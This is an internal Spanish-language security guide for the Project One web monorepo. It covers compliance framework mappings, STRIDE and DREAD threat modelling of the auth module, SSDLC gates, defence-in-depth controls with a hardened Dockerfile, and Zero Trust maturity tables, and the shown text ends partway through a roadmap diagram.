# Guía Enterprise de Seguridad — Project One

> **Versión:** 1.0.0  
> **Fecha:** 2026-08-02  
> **Estado:** Documento vivo — actualizado con cada release de seguridad  
> **Autor:** Equipo de Seguridad Project One  
> **Clasificación:** Interno — Distribución controlada  

---

## 1. Resumen Ejecutivo

### 1.1 Propósito

Esta guía establece el **marco de seguridad enterprise** para el monorepo **Project One** (Node.js/Express + Prisma + PostgreSQL + React/Vite + JWT + GitHub Actions + AWS ECS/RDS + Vercel + Floci). Su objetivo es:

- **Unificar** criterios, estándares y prácticas de seguridad en un solo documento de referencia
- **Complementar** (no duplicar) la documentación existente: `SECURITY.md` (políticas OWASP Top 10 implementadas), `security-design.md` (defense in depth post-implementación), `segremp-rules.md` (reglas Semgrep SAST)
- **Proveer** una hoja de ruta madurez seguridad (niveles 1–5) con gap analysis accionable
- **Servir** como evidencia para auditorías (ISO 27001, SOC 2, FedRAMP, PCI-DSS, GDPR/CCPA)

### 1.2 Audiencia

| Rol | Uso principal |
|-----|---------------|
| **Desarrolladores** | Estándares de codificación segura, checklists PR, threat modeling |
| **DevOps / Platform** | Pipeline hardening, SLSA, supply chain, secret management, IaC security |
| **Security Engineers** | Threat modeling, vulnerability management, incident response, compliance |
| **Auditores / Compliance** | Mapeo controles → estándares (NIST CSF 2.0, ISO 27001, SOC 2, CIS v8) |
| **Liderazgo técnico** | Roadmap madurez, OKRs seguridad, inversión en tooling |

### 1.3 Alcance

| Incluido | Excluido (docs separados) |
|----------|---------------------------|
| Arquitectura Zero Trust, IAM enterprise, criptografía aplicada | Políticas OWASP Top 10 detalle implementación (`SECURITY.md`) |
| SSDLC, threat modeling metodologías, secure coding standards | Diseño defensa en profundidad post-impl (`security-design.md`) |
| CI/CD security enterprise (SLSA, sigstore, SBOM, VEX) | Reglas Semgrep específicas (`segremp-rules.md`) |
| Cloud/container/K8s security, runtime observability | Estado actual CI/CD (`cicd-estado-actual.md`) |
| Vulnerability management, incident response, compliance | Plan implementación CI/CD (`cicd-plan-implementacion.md`) |
| Cultura DevSecOps, roadmap madurez, catálogo herramientas | |

### 1.4 Cómo leer esta guía

- **Secciones 1–3**: Contexto estratégico y marcos normativos
- **Secciones 4–7**: Fundamentos técnicos (threat modeling, SSDLC, defense in depth, Zero Trust)
- **Secciones 8–14**: Controles por capa tecnológica (IAM, API, Node/Express, React, PostgreSQL/Prisma, criptografía, secretos)
- **Sección 15**: Taxonomía completa herramientas AST (SAST/DAST/IAST/SCA/secret/container/IaC/license/SBOM)
- **Sección 16** (★): **CI/CD Security enterprise** — apartado estrella, muy detallado
- **Secciones 17–22**: Operaciones (runtime, cloud, container/K8s, vuln mgmt, incident response, compliance)
- **Secciones 23–25**: Estándares, cultura, roadmap madurez con gap analysis del proyecto
- **Secciones 26–27**: Catálogo herramientas y referencias

---

## 2. Glosario Enterprise

> **Convención**: Términos técnicos estándar en **inglés** (mayúsculas donde corresponda), definiciones en español.

| Término | Definición |
|---------|------------|
| **Zero Trust** | Modelo de seguridad que elimina la confianza implícita basada en ubicación de red; todo acceso se verifica continuamente (identity, device, network, app/workload, data) — NIST SP 800-207 |
| **SLSA v1.0 Build Track L1–L3** | Supply-chain Levels for Software Artifacts: niveles de integridad cadena suministro. L1: provenance básico; L2: build service + tamper-resistant; L3: hardened build + non-falsifiable provenance. **NO L4 en v1.0** |
| **SBOM** | Software Bill of Materials: inventario formal, machine-readable de componentes, dependencias y metadatos (CycloneDX 1.6, SPDX 3.0) |
| **STRIDE** | Metodología threat modeling Microsoft: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege |
| **DREAD** | Modelo cuantitativo riesgo: Damage, Reproducibility, Exploitability, Affected Users, Discoverability (1–10 cada uno) |
| **PASTA** | Process for Attack Simulation and Threat Analysis: 7 etapas, centrada en riesgo negocio, atacante → activo |
| **Trike** | Threat modeling centrada en requisitos de seguridad y asignación de riesgo a activos |
| **Attack Trees** | Representación gráfica jerárquica de caminos de ataque contra un objetivo (root = objetivo, leaves = pasos atómicos) |
| **VAST** | Visual, Agile, Simple Threat modeling: integrada en SDLC ágil, usa diagramas de flujo de datos |
| **hTMM** | Hybrid Threat Modeling Method: combina STRIDE + Attack Trees + CVSS para priorización |
| **MITRE ATT&CK** | Base de conocimiento tácticas/techniques/procedures (TTPs) adversarios; matriz Enterprise, Mobile, ICS |
| **NIST CSF 2.0** | Cybersecurity Framework v2.0 (2024): 6 funciones — **Govern** (nueva), Identify, Protect, Detect, Respond, Recover |
| **ISO/IEC 27001/27002** | Estándar internacional SGSI (Sistema Gestión Seguridad Información): requisitos (27001) + controles (27002:2022) |
| **SOC 2 Type II** | AICPA Trust Services Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy — auditoría periodo (6–12 meses) |
| **FedRAMP** | Federal Risk and Authorization Management Program: baseline seguridad cloud para gobierno US (Low/Moderate/High) |
| **RASP** | Runtime Application Self-Protection: instrumentación en runtime que detecta/bloquea ataques (ej. Contrast, Datadog ASM) |
| **mTLS** | Mutual TLS: autenticación bidireccional cliente-servidor con certificados X.509 |
| **HSM** | Hardware Security Module: dispositivo físico certificado FIPS 140-2/3 para generación/almacenamiento claves |
| **KMS** | Key Management Service: gestión centralizada claves criptográficas (AWS KMS, GCP KMS, Azure Key Vault, HashiCorp Vault) |
| **OIDC Federation** | OpenID Connect federation: identidad federada sin long-lived secrets (GitHub Actions → AWS via OIDC, no Access Keys) |
| **Sigstore** | Proyecto Linux Foundation: firma keyless de artifacts (cosign + Fulcio CA + Rekor transparency log) |
| **Cosign** | Herramienta CLI Sigstore: firma/verificación container images, binarios, SBOMs con OIDC identity |
| **CycloneDX 1.6** | Estándar SBOM (OWASP): JSON/XML, soporte VEX, componentes, servicios, vulnerabilidades, pedigree |
| **SPDX 3.0** | Software Package Data Exchange (Linux Foundation): SBOM + licensing + security + AI/ML model cards |
| **VEX** | Vulnerability Exploitability Exchange: declaración machine-readable si vulnerabilidad es explotable en contexto (CSAF, OpenVEX, CycloneDX VEX) |
| **CVSS v4.0** | Common Vulnerability Scoring System v4: Base + Threat + Environmental + Supplemental metrics |
| **EPSS** | Exploit Prediction Scoring System (FIRST): probabilidad 0–1 de explotación en 30 días |
| **KEV** | Known Exploited Vulnerabilities Catalog (CISA): CVEs con evidencia explotación activa — prioridad máxima |
| **ASVS** | Application Security Verification Standard (OWASP): niveles 1/2/3, 14 capítulos, requisitos testables |
| **SAMM** | Software Assurance Maturity Model (OWASP): 5 funciones negocio, 15 prácticas, 3 niveles madurez |
| **SSDF SP 800-218** | Secure Software Development Framework (NIST): 4 grupos (Prepare, Protect, Produce, Respond), 10 prácticas |
| **OpenSSF Scorecard** | Tarjeta de puntuación seguridad open source: 18 checks (CI/CD, vulnerabilidades, mantenimiento, etc.) |

---

## 3. Marcos y Estándares — Tabla Comparativa

### 3.1 Matriz de Cobertura por Función NIST CSF 2.0

| Función CSF 2.0 | ISO 27001:2022 (Anexo A) | CIS Controls v8 | SOC 2 TSC | OWASP SAMM | SSDF SP 800-218 | SLSA v1.0 | FedRAMP | PCI-DSS v4.0 | HIPAA | GDPR/CCPA |
|------------------|---------------------------|-----------------|-----------|------------|-----------------|-----------|---------|--------------|-------|-----------|
| **Govern (GV)** | A.5.1–5.37 (Políticas) | 1, 2, 3, 4, 14 | CC1.1–1.5 | Governance | PO.1–PO.5 | — | PM-1–PM-15 | 12.10 | 164.308(a)(1) | Art. 5, 24, 32 |
| **Identify (ID)** | A.8.1–8.3 (Activos) | 1, 2, 4, 7, 16 | CC6.1–6.8 | Design | PS.1–PS.3 | — | CM-8, RA-5 | 12.1–12.5 | 164.308(a)(1) | Art. 30, 32 |
| **Protect (PR)** | A.8.2–8.3, A.9, A.13 | 3, 4, 5, 7, 10, 13, 16 | CC6.1–6.8, CC7.1–7.5 | Implementation | PW.1–PW.9 | L1–L3 Build | AC-1–AC-20, SC-8, SC-13 | 3.1–3.7, 4.1–4.3, 8.1–8.5 | 164.312(a–e) | Art. 25, 32 |
| **Detect (DE)** | A.12.4, A.16 | 6, 8, 13, 16 | CC7.1–7.5 | Verification | RV.1–RV.3 | — | AU-6, SI-4 | 10.1–10.7, 11.5 | 164.312(b) | Art. 33–34 |
| **Respond (RS)** | A.16.1 | 13, 16, 17, 18 | CC7.1–7.5 | Operations | RR.1–RR.2 | — | IR-1–IR-9 | 12.10 | 164.308(a)(6) | Art. 33–34 |
| **Recover (RC)** | A.17.1–17.2 | 11, 17, 18 | CC7.1–7.5 | — | — | — | CP-1–CP-10 | 12.10 | 164.308(a)(7) | Art. 32 |

> **Nota**: La función **Govern (GV)** es **nueva en CSF 2.0** (2024). Establece la gobernanza, estrategia y supervisión del programa de ciberseguridad. Antes estaba implícita; ahora es explícita y medible.

### 3.2 Mapeo Controles Críticos Project One → Estándares

| Control Project One | NIST CSF 2.0 | ISO 27001 | CIS v8 | SOC 2 | OWASP ASVS | SLSA |
|---------------------|--------------|-----------|--------|-------|------------|------|
| JWT HS256/RS256 + rotation | PR.AC-1, PR.AC-7 | A.9.2, A.9.4 | 5.1, 5.2 | CC6.1 | V4.1, V4.2 | — |
| Helmet CSP + HSTS | PR.IP-1, PR.DS-2 | A.13.1, A.13.2 | 13.1, 13.2 | CC6.7 | V12.1, V12.2 | — |
| Rate limiting (login/refresh/global) | PR.AC-7, PR.IP-1 | A.9.4, A.12.1 | 4.1, 16.1 | CC6.1, CC7.2 | V4.6, V11.2 | — |
| Semgrep SAST pre-commit + CI | DE.CM-1, DE.CM-8 | A.12.6, A.14.2 | 16.1, 16.2 | CC7.1 | V1.1, V1.2 | L1–L3 |
| CodeQL SAST CI | DE.CM-1 | A.14.2 | 16.1 | CC7.1 | V1.1 | L1–L3 |
| Trivy SCA (HIGH/CRITICAL) | ID.RA-1, DE.CM-8 | A.12.6, A.8.1 | 7.1, 7.2 | CC7.1 | V13.1, V13.2 | L1–L3 |
| Gitleaks secret scanning | DE.CM-1, PR.IP-1 | A.12.6, A.8.2 | 3.1, 16.1 | CC7.1 | V7.1 | L1–L3 |
| SLSA provenance (cosign) | PR.DS-6, ID.SC-3 | A.14.2, A.15.1 | 16.1, 3.1 | CC7.1 | V14.1 | **L3** |
| SBOM CycloneDX 1.6 | ID.AM-1, ID.SC-3 | A.8.1, A.15.1 | 1.1, 16.1 | CC7.1 | V13.1 | L1–L3 |
| OIDC Federation GH Actions→AWS | PR.AC-1, PR.AC-7 | A.9.2, A.9.4 | 5.1, 5.2 | CC6.1 | V4.1 | L2–L3 |
| mTLS service-to-service | PR.DS-2, PR.AC-3 | A.13.1, A.13.2 | 13.1, 13.2 | CC6.7 | V9.1, V9.2 | — |
| Prisma parameterized queries | PR.IP-1, PR.DS-6 | A.14.2 | 16.1 | CC7.1 | V5.1, V5.2 | — |
| CSP reporting production | DE.CM-1, DE.CM-7 | A.12.4 | 8.1, 8.2 | CC7.1 | V12.1 | — |
| Security event logging | DE.AE-1, DE.CM-1 | A.12.4 | 8.1, 8.2 | CC7.1 | V8.1, V8.2 | — |
| Changesets + signed releases | PR.DS-6, RC.RP-1 | A.14.2, A.12.3 | 3.1, 16.1 | CC7.1 | V14.1 | L2–L3 |

---

## 4. Metodologías Threat Modeling

### 4.1 Comparativa Metodologías

| Metodología | Enfoque | Complejidad | Mejor para | Output | Integración SDD/OpenSpec |
|-------------|---------|-------------|------------|--------|--------------------------|
| **STRIDE** | Categoría amenazas (6) | Baja–Media | Aplicaciones web, APIs, cloud | Lista amenazas por categoría | Design phase → `design.md` threats section |
| **DREAD** | Cuantitativo riesgo (5 factores) | Media | Priorización vulnerabilidades | Score 1–10 por amenaza | Post-implementation → risk register |
| **PASTA** | 7 etapas, riesgo negocio | Alta | Enterprise, regulated, complex systems | Attack trees + risk report | Requirements phase → `proposal.md` risk section |
| **Trike** | Requisitos seguridad + asignación riesgo | Alta | Sistemas con requisitos formales | Threat model + risk assignments | Design phase → security requirements |
| **Attack Trees** | Gráfico jerárquico caminos ataque | Media–Alta | Análisis profundo vectores específicos | Árbol ataque (root → leaves) | Design phase → attack tree diagrams |
| **VAST** | Ágil, visual, integrada SDLC | Baja | Equipos DevOps, sprints cortos | DFD + threat list por historia | Sprint planning → story-level threats |
| **hTMM** | Híbrido STRIDE + Attack Trees + CVSS | Media | Balance rigor/agilidad | Threat list + CVSS scores | Design phase → prioritized backlog |

### 4.2 Cuándo Usar Cada Una (Decision Tree)

```
┌─────────────────────────────────────────────────────────────┐
│  ¿Nuevo feature o cambio arquitectónico significativo?      │
└──────────────┬──────────────────────────────────────────────┘
               │
       ┌───────▼───────┐
       │ ¿Regulado     │── Sí ──▶ PASTA (7 etapas) + Trike (requisitos)
       │ (FinTech,     │         + Attack Trees (vectores críticos)
       │ Health, Gov)? │
       └───────┬───────┘
               │ No
       ┌───────▼───────┐
       │ ¿Equipo       │── Sí ──▶ VAST (integrado en sprint)
       │ DevOps maduro │         + STRIDE por historia
       │ + CI/CD?      │
       └───────┬───────┘
               │ No
       ┌───────▼─────────────────────┐
       │ ¿Análisis profundo          │── Sí ──▶ Attack Trees + hTMM
       │ vector específico (auth,    │         (CVSS priorización)
       │ crypto, supply chain)?      │
       └───────────────┬─────────────┘
                       │ No
                       ▼
              STRIDE baseline
              (rápido, coverage amplio)
```

### 4.3 Ejemplo Aplicado: Módulo Auth Project One

#### 4.3.1 STRIDE en Auth Module

| Categoría | Amenaza | Vector | Mitigación Implementada | Gap |
|-----------|---------|--------|-------------------------|-----|
| **Spoofing** | Suplantación identity via token robado | JWT theft (XSS, MITM) | HttpOnly cookies (refresh), short-lived access (15m), CSP strict | ❌ No MFA, no device binding |
| **Tampering** | Manipulación JWT (alg none, key confusion) | `alg: none`, HS256→RS256 confusion | `jwt.verify` con algoritmo explícito, RS256 en prod | ⚠️ HS256 permitido en config |
| **Repudiation** | Usuario niega acción (no audit trail) | Falta logging non-repudiation | Security event logging parcial | ❌ No audit trail firmado, no non-repudiation |
| **Info Disclosure** | Fuga datos sensibles en token/error | JWT payload expuesto, error verbose | JWT sin PII, error messages controlados | ⚠️ Refresh token en cookie (CSRF risk mitigado) |
| **DoS** | Brute force login, token exhaustion | Login sin rate limit, refresh spam | `loginLimiter` (5/15min), `refreshTokenLimiter` | ⚠️ No account lockout progresivo |
| **Elevation** | Privilege escalation via role manipulation | Mass assignment role field, JWT claim injection | Joi `allowUnknown: false`, RBAC middleware | ⚠️ No JIT access, no break-glass |

#### 4.3.2 Attack Tree: Compromiso Cuenta Admin

```mermaid
graph TD
    A[Compromiso Cuenta Admin] --> B[Robo Credenciales]
    A --> C[Bypass Autenticación]
    A --> D[Escalada Privilegios]
    A --> E[Persistencia]
    
    B --> B1[Phishing / Credential Stuffing]
    B1 --> B1a[MFA ausente ✅ GAP]
    B1 --> B1b[Password spray]
    B1b --> B1b1[Rate limit login 5/15m ✅]
    B1b --> B1b2[No account lockout progresivo ⚠️ GAP]
    
    B --> B2[Token Theft]
    B2 --> B2a[XSS roba access token sessionStorage]
    B2a --> B2a1[CSP strict + Trusted Types ⚠️ parcial]
    B2a --> B2a2[HttpOnly cookie solo refresh ✅]
    B2 --> B2b[MITM en red no confiable]
    B2b --> B2b1[TLS 1.2+ enforced ✅]
    B2b --> B2b2[No mTLS cliente-servidor ❌ GAP]
    B2 --> B2c[Log leakage]
    B2c --> B2c1[Logging seguro implementado ✅]
    
    C --> C1[JWT Algorithm Confusion]
    C1 --> C1a[RS256 enforced en prod ⚠️ config permite HS256]
    C --> C2[Token Replay]
    C2 --> C2a[Short-lived access 15m ✅]
    C2 --> C2b[Refresh token rotation ✅]
    C2 --> C2c[No token binding (device/IP) ❌ GAP]
    
    D --> D1[Mass Assignment role]
    D1 --> D1a[Joi allowUnknown:false ✅]
    D1 --> D1b[RBAC middleware verifyRole ✅]
    D --> D2[JWT Claim Injection]
    D2 --> D2a[Issuer/Audience validation ✅]
    D2 --> D2b[Key confusion mitigado ✅]
    
    D --> D3[Session Fixation]
    D3 --> D3a[New session on login ✅]
    
    E --> E1[Refresh Token Long-lived]
    E1 --> E1a[24h TTL ⚠️ considerar reducir]
    E1 --> E1b[Rotation on use ✅]
    E --> E2[Backdoor Account]
    E2 --> E2a[No break-glass procedure ❌ GAP]
    
    style A fill:#ffcccc,stroke:#dc2626,stroke-width:2px
    style B1a fill:#ffe5b4,stroke:#d97706
    style B1b2 fill:#ffe5b4,stroke:#d97706
    style C1a fill:#ffe5b4,stroke:#d97706
    style E2a fill:#ffe5b4,stroke:#d97706
```

#### 4.3.3 DREAD Scoring Auth Threats

| Amenaza | Damage (1–10) | Reproducibility (1–10) | Exploitability (1–10) | Affected Users (1–10) | Discoverability (1–10) | **DREAD Score** | Prioridad |
|---------|---------------|------------------------|----------------------|----------------------|------------------------|-----------------|-----------|
| Credential stuffing admin (sin MFA) | 10 | 9 | 8 | 1 (targeted) | 7 | **7.0** | CRITICAL |
| JWT alg confusion (HS256→RS256) | 9 | 7 | 6 | 10 | 5 | **7.4** | HIGH |
| XSS → access token theft | 8 | 6 | 7 | 10 | 6 | **7.4** | HIGH |
| Refresh token replay (sin rotation) | 7 | 8 | 5 | 5 | 4 | **5.8** | MEDIUM |
| Mass assignment role escalation | 9 | 5 | 4 | 3 | 3 | **4.8** | MEDIUM |
| Session fixation | 6 | 4 | 3 | 2 | 3 | **3.6** | LOW |

> **Regla Project One**: DREAD ≥ 7.0 → fix en sprint actual; 5.0–6.9 → próximo sprint; < 5.0 → backlog con owner.

---

## 5. SSDLC Seguro (Secure Software Development Lifecycle)

### 5.1 Fases SSDLC Integradas con SDD/OpenSpec

```mermaid
flowchart LR
    subgraph REQ["📋 REQUIREMENTS"]
        R1[Security Requirements\nElicitation] --> R2[Threat Modeling\nSTRIDE/PASTA]
        R2 --> R3[Risk Assessment\nDREAD/CVSS]
        R3 --> R4[Security Acceptance\nCriteria]
    end
    
    subgraph DES["🎨 DESIGN"]
        D1[Security Architecture\nReview] --> D2[Data Flow Diagrams\nTrust Boundaries]
        D2 --> D3[Security Patterns\nSelection]
        D3 --> D4[Crypto Design\nKey Management]
        D4 --> D5[Design Review\nSign-off]
    end
    
    subgraph IMPL["💻 IMPLEMENTATION"]
        I1[Secure Coding\nStandards] --> I2[Code Review\nSecurity Checklist]
        I2 --> I3[SAST Pre-commit\nSemgrep]
        I3 --> I4[SAST CI\nCodeQL + Semgrep]
        I4 --> I5[Secret Scan\nGitleaks]
        I5 --> I6[Dependency Check\nTrivy]
    end
    
    subgraph TEST["🧪 TESTING"]
        T1[Unit Tests\nSecurity-focused] --> T2[Integration Tests\nAuth/Authorization]
        T2 --> T3[DAST\nOWASP ZAP/Nuclei]
        T3 --> T4[IAST\nContrast/Datadog]
        T4 --> T5[Penetration Test\nPeriodic]
        T5 --> T6[Security Regression\nSuite]
    end
    
    subgraph DEPLOY["🚀 DEPLOYMENT"]
        P1[Build Hardening\nSLSA L1–L3] --> P2[Artifact Signing\ncosign/Sigstore]
        P2 --> P3[SBOM Generation\nCycloneDX/SPDX]
        P3 --> P4[VEX Assessment\nExploitability]
        P4 --> P5[Policy Enforcement\nKyverno/OPA]
        P5 --> P6[Deploy Gates\nStaging → Prod]
    end
    
    subgraph OPS["🔧 OPERATIONS"]
        O1[Runtime Protection\nRASP/eBPF/Falco] --> O2[Vuln Management\nCVSS/EPSS/KEV]
        O2 --> O3[Incident Response\nNIST 800-61r2] --> O4[Continuous Monitoring\nSIEM/SOAR]
        O4 --> O5[Compliance Drift\nDetection] --> O6[Security Training\nChampions Program]
    end
    
    REQ --> DES --> IMPL --> TEST --> DEPLOY --> OPS
    OPS -.->|Feedback Loop| REQ
    
    style REQ fill:#a5f3fc,stroke:#0891b2
    style DES fill:#bbf7d0,stroke:#16a34a
    style IMPL fill:#fef08a,stroke:#ca8a04
    style TEST fill:#fecaca,stroke:#dc2626
    style DEPLOY fill:#e9d5ff,stroke:#a855f7
    style OPS fill:#ffedd5,stroke:#ea580c
```

### 5.2 Shift-Left en Project One

| Etapa Tradicional | Shift-Left Project One | Herramienta | Gate |
|-------------------|------------------------|-------------|------|
| Requirements | Security requirements en `proposal.md` (OpenSpec) | — | Design review |
| Design | Threat modeling en `design.md` (STRIDE + Attack Trees) | Mermaid diagrams | Architecture review |
| Implementation | SAST en **pre-commit** (Semgrep staged) | `semgrep-sast` | Commit blocked |
| Implementation | Secret scan en **pre-commit** (Gitleaks staged) | `gitleaks protect` | Commit blocked |
| Implementation | SAST en **CI PR** (CodeQL + Semgrep) | `security.yml` | PR blocked |
| Implementation | SCA en **CI PR** (Trivy HIGH/CRITICAL) | `security.yml` | PR blocked |
| Implementation | Dependency Review (GitHub native) | `dependency-review-action` | PR blocked |
| Build | SLSA Provenance L1–L3 | `slsa-github-generator` | Release gate |
| Build | Artifact signing (cosign keyless) | `cosign sign` | Release gate |
| Build | SBOM CycloneDX + SPDX | `anchore/sbom-action` | Release gate |
| Deploy | Policy enforcement (Kyverno) | `policy-controller` | Deploy gate |
| Runtime | RASP / Falco / eBPF | Datadog ASM / Falco | Alert → IR |

### 5.3 Integración SDD/OpenSpec

El proyecto usa **Specification-Driven Development (SDD)** con artefactos OpenSpec. Cada fase SSDLC mapea a artefactos:

| Fase SSDLC | Artefacto OpenSpec | Contenido Seguridad |
|------------|---------------------|---------------------|
| Requirements | `proposal.md` | Security objectives, compliance scope, risk appetite |
| Requirements | `specs.md` (delta) | Security functional requirements (WHEN/THEN) |
| Design | `design.md` | Threat models, trust boundaries, crypto design, security patterns |
| Design | `tasks.md` | Security tasks con checkboxes (implementation, testing, verification) |
| Implementation | `tasks.md` ejecución | Secure coding, SAST gates, secret scans, dependency checks |
| Testing | `tasks.md` verificación | Security test cases, DAST/IAST config, pen test scope |
| Deployment | `tasks.md` deploy | SLSA provenance, SBOM, VEX, policy enforcement, rollback |
| Operations | Post-implementation | Monitoring rules, runbooks, compliance evidence collection |

> **Regla**: Ningún task de seguridad se marca `completed` sin evidencia (PR link, scan report, test result).

---

## 6. Defense in Depth Enterprise

### 6.1 Capas de Defensa (Cross-ref: `security-design.md` Section 1)

| Capa | Descripción | Controles Project One | Referencia security-design.md |
|------|-------------|----------------------|-------------------------------|
| **Perimeter** | Edge network, WAF, DDoS protection | CloudFlare/AWS Shield (proyectado), rate limiting global | Section 1: "Network layer: CORS configuration" |
| **Network** | Segmentación, mTLS, zero trust network | VPC, Security Groups, NACLs, mTLS service-to-service (proyectado) | Section 1: "Network layer" |
| **Host** | OS hardening, container security, runtime protection | Distroless containers, read-only FS, non-root, seccomp (proyectado) | — |
| **Application** | Secure code, input validation, authZ/authN, CSP | Helmet, Joi validation, JWT, RBAC, CSRF, rate limiters | Section 1: "Application layer", Section 4 Decisions 1–5 |
| **Data** | Encryption at rest/transit, masking, RLS, audit | TLS 1.2+, Prisma parameterized, secrets env vars (at rest: gap) | Section 1: "Data layer: Joi validation" |
| **Identity** | Zero Trust IAM, MFA, SSO, JIT, secret rotation | JWT HS256/RS256, refresh rotation, OIDC federation (CI/CD) | Section 1: "Authentication layer", Section 4 Decision 1 |

### 6.2 Patrones por Capa (Enterprise)

#### Perimeter
- **WAF Managed Rules**: AWS WAF / CloudFlare OWASP Top 10 rule set + rate-based rules
- **DDoS Protection**: AWS Shield Standard (incluido) / Advanced (proyectado)
- **Geo-blocking**: Restricción países alto riesgo (configurable)
- **Bot Management**: Challenge-page, JavaScript detection, behavioral analysis

#### Network
```mermaid
graph TB
    subgraph INTERNET[Internet]
        U[Users]
        B[Bots/Attackers]
    end
    
    subgraph EDGE[Edge / Perimeter]
        CF[CloudFlare / AWS Shield\nWAF + DDoS + Bot Mgmt]
        CDN[CDN + TLS Termination]
    end
    
    subgraph VPC[AWS VPC / Project One Network]
        subgraph PUBLIC[Public Subnets]
            ALB[Application Load Balancer\nWAF Integrated]
            NAT[NAT Gateway]
        end
        
        subgraph PRIVATE_APP[Private App Subnets]
            ECS[ECS Fargate Services\nExpress API]
            sidecar[Sidecar: Envoy / mTLS]
        end
        
        subgraph PRIVATE_DATA[Private Data Subnets]
            RDS[RDS PostgreSQL\nEncrypted + IAM Auth]
            REDIS[ElastiCache Redis\nEncrypted + Auth]
        end
        
        subgraph MGMT[Management Subnet]
            BASTION[Bastion Host / SSM Session Manager]
            MON[Monitoring / Prometheus / Grafana]
        end
    end
    
    U --> CF --> CDN --> ALB
    B -.->|Blocked| CF
    ALB --> ECS
    ECS --> RDS
    ECS --> REDIS
    ECS -.->|mTLS| sidecar
    sidecar -.->|mTLS| RDS
    
    style CF fill:#ffcccc,stroke:#dc2626
    style ALB fill:#ffe5b4,stroke:#d97706
    style ECS fill:#bbf7d0,stroke:#16a34a
    style RDS fill:#a5f3fc,stroke:#0891b2
```

#### Host (Container Hardening)
```dockerfile
# Dockerfile Hardened - apps/server/Dockerfile.enterprise
FROM node:20-alpine AS base
# Non-root user
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001 -G nodejs

FROM base AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production --ignore-scripts

FROM base AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build

FROM gcr.io/distroless/nodejs20-debian12 AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/dist ./dist
COPY --from=builder --chown=nodejs:nodejs /app/package.json ./
USER nodejs
EXPOSE 3000
CMD ["dist/index.js"]
```

**Controles Host**:
- ✅ Distroless base (sin shell, sin package manager, superficie ataque mínima)
- ✅ Non-root user (UID 1001)
- ✅ Read-only filesystem (distroless inmutable)
- ✅ No build tools en imagen final
- ✅ Multi-stage build (separación build/runtime)
- ⚠️ Seccomp profile custom (pendiente)
- ⚠️ AppArmor profile (pendiente)
- ❌ Capability dropping (NO_NEW_PRIVS, drop ALL, add NET_BIND_SERVICE solo si needed)

#### Application (Controles Implementados + Gaps)

| Control | Implementado | Evidencia | Gap Enterprise |
|---------|--------------|-----------|----------------|
| Helmet CSP | ✅ | `utils/helmet/helmet.config.js` | Report-only en dev, enforce en prod |
| HSTS | ✅ | Helmet config | Preload list submission pendiente |
| Rate Limiting | ✅ | `middleware/rateLimit.js` (global, login, refresh) | Adaptive rate limiting (ML-based) |
| Input Validation | ✅ | Joi `allowUnknown: false` | Schema registry centralizado |
| JWT Auth | ✅ | `utils/jwt/createToken.js` | RS256 obligatorio prod, key rotation |
| Refresh Rotation | ✅ | `modules/auth/controller.js` | Token binding (device/IP) |
| CSRF Double-Submit | ✅ | `middleware/verifyCsrf.js` | SameSite=Strict en prod |
| CORS Strict | ✅ | `app.js` config | Origin allowlist por entorno |
| Security Logging | ✅ Parcial | Logger security events | Structured JSON, SIEM integration |
| Error Handling | ✅ | Global error handler | No stack traces en prod |

#### Data
| Control | Estado | Detalle |
|---------|--------|---------|
| TLS in Transit | ✅ | TLS 1.2+ enforced, HSTS, cert pinning (proyectado) |
| Encryption at Rest | ⚠️ Parcial | RDS encrypted (AWS managed), **application-level TDE faltante** |
| Column-level Encryption | ❌ | PII (email, phone) sin cifrado a nivel columna |
| Row Level Security (RLS) | ❌ | Multi-tenancy futuro requerirá RLS PostgreSQL |
| Data Masking | ❌ | Logs/monitoring sin enmascaramiento automático |
| Audit Logging | ⚠️ Parcial | Security events sí, **data access audit no** |
| PITR (Point-in-Time Recovery) | ✅ | RDS automated backups + PITR 35 días |
| Secrets en DB | ❌ | **Nunca** — usar KMS/Secrets Manager |

#### Identity
Ver [Sección 8: IAM Enterprise](#8-iam-enterprise).

---

## 7. Zero Trust Architecture

### 7.1 Principios NIST SP 800-207

| Pilar | Principio | Implementación Project One |
|-------|-----------|----------------------------|
| **Identity** | Verificar identidad continuamente (humanos + workloads) | JWT short-lived, refresh rotation, OIDC federation CI/CD, **MFA faltante**, device trust faltante |
| **Device** | Validar postura dispositivo (health, compliance, patch level) | **Gap total** — no device trust, no MDM/EDR integration |
| **Network** | Micro-segmentación, cifrado todo tráfico, no confianza por zona | VPC segmentation ✅, mTLS service-to-service ⚠️ (proyectado), **no zero trust network access (ZTNA)** |
| **Application/Workload** | Verificar integridad workload, least privilege, runtime protection | SLSA provenance ✅, distroless ✅, **RASP/Falco faltante**, runtime attestation faltante |
| **Data** | Clasificar, etiquetar, cifrar, controlar acceso por atributo (ABAC) | Classification faltante, encryption at rest parcial, **ABAC/RLS faltante**, DLP faltante |

### 7.2 Niveles Madurez Zero Trust (CISA Maturity Model)

| Nivel | Identity | Device | Network | App/Workload | Data | Project One Estado |
|-------|----------|--------|---------|--------------|------|-------------------|
| **Traditional** | Perímetro, VPN, AD | Gestionado corporativo | Perímetro firewall | On-prem, trust por red | Perímetro, DLP básico | — |
| **Initial** | MFA algunos, SSO básico | Inventario básico | Segmentación básica | Container scanning básico | Etiquetado manual | **Actual: ~Initial** |
| **Advanced** | MFA universal, risk-based auth, JIT | Compliance posture, EDR | Micro-segmentación, ZTNA | SLSA L2, signed artifacts, runtime protection | Automated classification, encryption by default | **Target: 12–18 meses** |
| **Optimal** | Continuous auth, passwordless, device trust | Real-time posture, auto-remediation | Fully zero trust network, encryption everywhere | SLSA L3, attestation, self-healing | ABAC, data-centric security, automated DLP | **Vision: 3+ años** |

### 7.3 Implementación Práctica Project One (Roadmap)

```mermaid
graph TD
    subgraph NOW["NOW (0-3 meses)"]
        N1[OIDC Federation GH Actions→AWS ✅]
        N2[SLSA L3 Provenance + cosign ✅]
        N3[SBOM CycloneDX/SPDX ✅]
        N4[Distroless + non-root ✅]
        N5[JWT RS256 obligatorio prod]
        N6[Short-lived access tokens 15m ✅]
        N7[Refresh rotation ✅]
        N8[Rate limiting multi-capa ✅]
    end
    
